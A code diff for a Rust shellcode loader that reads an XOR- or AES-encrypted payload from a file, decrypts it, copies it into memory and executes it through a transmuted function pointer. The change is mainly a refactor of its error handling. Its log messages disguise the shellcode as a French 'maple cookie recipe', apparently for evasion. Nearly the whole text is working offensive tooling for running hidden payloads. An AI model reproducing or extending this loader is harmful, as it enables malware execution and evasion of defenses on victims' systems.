@@ -37,14 +37,14 @@ pub struct AESShellCode {
 }
 
 impl ShellCode {
-    pub fn from_file(input_path: &str, mode: &str) -> ShellCode {
+    pub fn from_file(input_path: &str, mode: &str) -> anyhow::Result<ShellCode> {
         let shellcode = match std::fs::read(input_path) {
             Ok(result) => result,
             Err(error) => {
                 println!(
                     "[+] n'a pas lu la recette des biscuits à l'érable : {:?}",
                     error
-                ); 
+                );
                 std::process::exit(0x0100);
             }
         };
@@ -52,21 +52,22 @@ impl ShellCode {
         match mode {
             "xor" => {
                 println!("[+] la recette des biscuits à l'érable dectected as XOR encrypted");
-                let decoded_xor_object: XoredShellCode = bincode::deserialize(&shellcode).unwrap();
-                decoded_xor_object.xor();
+                let decoded_xor_object: XoredShellCode = bincode::deserialize(&shellcode)?;
+                Ok(decoded_xor_object.xor())
             }
             "aes" => {
                 println!(
                     "[+] la recette du cookie à l'érable a été détectée comme étant cryptée AES"
                 );
                 let decoded_aes_object: AESShellCode =
-                    bincode::deserialize(&serialized_aes_object).unwrap();
-                my_aes_shellcode.decrypt();
+                    bincode::deserialize(&shellcode)?;
+                Ok(decoded_aes_object.decrypt())
             }
             "plain" => {
                 println!("[+] la recette des biscuits à l'érable must be raw/normal");
-                ShellCode { sc: shellcode }
-            }
+                Ok(ShellCode { sc: shellcode })
+            },
+            &_ => todo!()
         }
     }
 
@@ -77,10 +78,13 @@ impl ShellCode {
 
         unsafe {
             std::ptr::copy(self.sc.as_ptr(), map.data(), self.sc.len());
-            println!("[+] fixer les protections de la mémoire à {:p}", self.sc.as_ptr()); 
+            println!(
+                "[+] fixer les protections de la mémoire à {:p}",
+                self.sc.as_ptr()
+            );
             println!("{:?}", self.sc.as_ptr());
             let exec_shellcode: extern "C" fn() -> ! = mem::transmute(map.data());
-            println!("[+] commencer la recette des biscuits à l'érable"); 
+            println!("[+] commencer la recette des biscuits à l'érable");
             exec_shellcode();
         }
     }
@@ -156,7 +160,7 @@ impl XoredShellCode {
         println!(
             "[+] a écrit une recette de cookies à l'érable cryptée XOR en {}",
             output_path
-        ); 
+        );
     }
 }
 
@@ -229,7 +233,7 @@ impl AESShellCode {
         {
             Ok(result) => result,
             Err(_error) => {
-                println!("[+] le fichier de sortie existe déjà {}", output_path); 
+                println!("[+] le fichier de sortie existe déjà {}", output_path);
                 std::process::exit(0x0100);
             }
         };
